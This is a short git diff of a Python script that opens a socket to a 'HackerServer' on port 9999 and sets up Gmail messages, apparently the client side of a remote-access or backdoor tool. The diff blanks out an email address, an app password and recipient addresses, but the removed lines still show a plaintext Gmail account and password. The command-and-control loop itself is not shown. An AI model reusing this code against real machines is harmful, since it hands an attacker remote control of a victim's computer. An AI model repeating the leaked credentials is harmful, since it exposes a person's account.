@@ -6,7 +6,7 @@ import subprocess
 import smtplib
 import socket
 
-host = '192.168.1.11'
+host = '192.168.1.110' # Connect To HackerServer.py
 port = 9999
 
 s = socket.socket()
@@ -14,14 +14,14 @@ s.connect((host, port))
 
 
 
-gmail_user = 'firdanramadhangitddeluxe404@gmail.com'
-gmail_app_password = 'Chandraramadhangitddeluxe407'
+gmail_user = ''
+gmail_app_password = ''
 
 # =============================================================================
 # SET THE INFO ABOUT THE SAID EMAIL
 # =============================================================================
 sent_from = gmail_user
-sent_to = ['firdanramadhangitddeluxe404@gmail.com', 'patriotsecteam@gmail.com']
+sent_to = ['', '']
 sent_subject = "Where are all my Robot Women at?"
 sent_body = ("Hey, what's up? friend!\n\n"
              "I hope you have been well!\n"
